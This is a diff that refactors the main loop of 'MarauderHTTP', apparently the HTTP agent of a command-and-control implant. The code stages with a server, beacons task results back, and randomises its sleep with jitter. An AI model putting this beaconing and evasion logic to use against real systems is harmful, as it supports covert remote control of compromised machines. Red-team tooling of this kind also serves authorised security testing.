@@ -1,15 +1,13 @@
 ﻿using System;
 using System.Threading;
 using MarauderHTTP.Common;
-using MarauderLib;
 using MarauderLib.Services;
-using static MarauderLib.Marauder;
+using _marauder = MarauderLib.Marauder;
 
 namespace MarauderHTTP
 {
     internal static class Program
     {
-        private static Marauder _marauder;
         private static Webclient _webclient;
         internal static Configuration Configuration;
 
@@ -23,7 +21,7 @@ namespace MarauderHTTP
 #endif
                 Configuration = new Configuration();
                 _webclient = new Webclient();
-                _marauder = new Marauder(Configuration.PayloadName, Configuration.PayloadKey, Configuration.Sleep,
+                _marauder.Init(Configuration.PayloadName, Configuration.PayloadKey, Configuration.Sleep,
                     Configuration.Jitter, Configuration.MaxAttempts, Configuration.ExpirationDate, Configuration.Debug);
             }
             catch (Exception e)
@@ -40,15 +38,15 @@ namespace MarauderHTTP
                     string message;
                     string response;
 
-                    if (String.IsNullOrEmpty(Marauder.Id))
+                    if (String.IsNullOrEmpty(_marauder.Id))
                     {
                         message = _marauder.Stage();
-                        response = _webclient.Stage(Marauder.PayloadName, Marauder.StagingId, message);
+                        response = _webclient.Stage(_marauder.PayloadName, _marauder.StagingId, message);
                     }
                     else
                     {
                         message = _marauder.GetResults();
-                        response = _webclient.Beacon(Marauder.Id, message);
+                        response = _webclient.Beacon(_marauder.Id, message);
                     }
 
                     if (!String.IsNullOrEmpty(response))
@@ -57,12 +55,12 @@ namespace MarauderHTTP
                     }
 
                     // Start Sleep
-                    double sleep = Marauder.Sleep;
+                    double sleep = _marauder.Sleep;
 
                     // Here we account for jitter
-                    if (Marauder.Jitter > 0 && Marauder.Jitter <= 1)
+                    if (_marauder.Jitter > 0 && _marauder.Jitter <= 1)
                     {
-                        double offset = Marauder.Sleep * Marauder.Jitter;
+                        double offset = _marauder.Sleep * _marauder.Jitter;
                         Random random = new Random();
                         double result = random.NextDouble() * (offset - (offset * -1)) + (offset * -1);
                         sleep = sleep + result;
